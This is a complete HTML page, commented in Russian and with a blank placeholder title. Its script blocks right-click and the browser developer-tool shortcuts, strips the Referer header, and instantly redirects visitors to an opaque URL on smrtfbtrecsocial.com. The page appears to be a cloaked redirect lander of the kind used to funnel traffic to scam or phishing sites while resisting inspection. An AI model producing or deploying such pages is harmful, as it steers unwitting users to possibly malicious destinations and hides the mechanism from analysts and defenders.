<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- ВАЖНО: запрещаем отправку Referer -->
  <meta name="referrer" content="no-referrer" />
  <meta http-equiv="Referrer-Policy" content="no-referrer" />

  <title>...</title>
</head>
<body>
  <noscript>This page requires JavaScript.</noscript>

  <script>
  (function () {
    // ====== БАЗОВАЯ БЛОКИРОВКА DEVTOOLS (ограниченно, но без тормозов) ======
    // Контекстное меню
    window.addEventListener("contextmenu", function(e){ e.preventDefault(); }, {capture:true});
    // Горячие клавиши
    window.addEventListener("keydown", function(e){
      const k = (e.key || "").toUpperCase();
      if (k === "F12" || e.keyCode === 123) { e.preventDefault(); return; }
      if (e.ctrlKey && e.shiftKey && (k === "I" || k === "J" || k === "C")) { e.preventDefault(); return; }
      if (e.ctrlKey && k === "U") { e.preventDefault(); return; }
    }, {capture:true});

    // ====== МГНОВЕННЫЙ РЕДИРЕКТ БЕЗ РАЗВЕТОВ ПО ОС ======
    var TARGET_URL = "https://smrtfbtrecsocial.com/STKEFSwImS";

    // Сразу, без ожиданий и без лоадеров:
    try {
      // meta no-referrer сверху уже отключает реферер при навигации
      location.replace(TARGET_URL);
      // На случай, если какой-то браузер вдруг “промажет”:
      setTimeout(function(){ location.href = TARGET_URL; }, 100);
    } catch (_) {
      location.href = TARGET_URL;
    }
  })();
  </script>
</body>
</html>
